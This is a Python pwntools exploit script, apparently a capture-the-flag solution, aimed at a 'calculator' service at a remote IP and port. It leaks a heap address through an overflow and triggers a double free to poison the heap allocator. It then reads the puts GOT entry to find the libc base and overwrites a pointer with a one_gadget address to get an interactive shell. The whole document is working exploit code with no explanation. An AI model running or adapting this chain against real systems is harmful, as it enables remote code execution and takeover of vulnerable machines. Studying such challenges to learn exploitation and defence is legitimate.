from pwn import *
#p = process('./calculator')
p = remote('35.201.210.117', 9007)
libc = ELF('/home/jammin/Desktop/github/SF_Blog/libc_compatible/lib/x86_64-linux-gnu/libc-2.23.so')
e = ELF('./calculator')

def menu(num):
   p.sendlineafter('exit\n',str(num))#1 : type
             #2 : modify
             #3 : delete

def mytype(numb, num1, num2):
   menu(1)
   p.sendlineafter('\n',str(numb))
   p.sendafter('[1]\n',num1)
   p.sendafter('[2]\n',num2)

def modify(numb, num, content):
   menu(2)
   p.sendlineafter('0~4\n', str(numb))
   p.sendlineafter('number2\n', str(num))
   p.sendafter('new : ', content)

def delete(numb, num):
   menu(3)
   p.sendlineafter('0~4\n', str(numb))
   p.sendlineafter('both\n', str(num))

def calculate(numb, num):
   menu(4)
   p.sendlineafter('0~4\n', str(numb))
   p.sendlineafter('\n', str(num))

def memo(content):
   menu(5)
   p.sendafter('memo\n', content)

def show():
   menu(6)

puts_got = e.got['puts']

mytype(0, '2', '1')
mytype(1, '2', '3')
delete(1, 1)
delete(1, 2)
pl = ''
pl += 'a'*0x70
modify(0, 2, pl)
show()
p.recvuntil('a'*0x70)
heap_addr =  u64(p.recv(3).ljust(8, '\x00'))
heap_base = heap_addr-0x1c0
print('heap_base ='+hex(heap_base))
pl = ''
pl += p64(0x1)
pl += p64(0)*12
pl += p64(0x71)
pl += p64(heap_addr)
modify(0, 2, pl)

raw_input()
mytype(1, '1', '2')
modify(1, 1, p64(0))
modify(1, 1, '1')
mytype(2, 'a'*4, 'b'*4)
mytype(3, 'a'*4 ,'b'*4)

delete(2, 2)
calculate(1, 3)
delete(3, 2)
delete(2, 2)#double free

memo(p64(0x603000))
mytype(4, 'aaaa', 'bbbb')

memo(p64(puts_got))
show()
p.recvuntil('[0] ')
puts_got = u64(p.recv(6).ljust(8, '\x00'))
libc_base = puts_got - libc.sym['puts']
print('puts_got ='+hex(puts_got))
one_off = [0x45226, 0x4527a, 0xf0364, 0xf1207]
one_gadget = libc_base + one_off[0]
modify(0,1, p64(one_gadget))
#'''
raw_input()

p.interactive()